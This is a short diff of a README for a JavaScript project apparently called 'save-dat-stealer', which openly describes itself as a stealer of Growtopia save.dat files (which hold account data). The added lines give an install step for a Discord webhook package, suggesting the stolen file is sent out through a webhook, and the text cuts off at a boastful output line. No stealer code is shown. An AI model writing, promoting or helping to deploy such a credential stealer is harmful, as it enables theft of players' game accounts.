@@ -1,6 +1,9 @@
 # save-dat-stealer
 A growtopia save.dat stealer in javascript.
 
+# installations
+- npm i discord-webhook-node
+
 # output
 ```js
 Get ready.. we'll stole a save.data :D
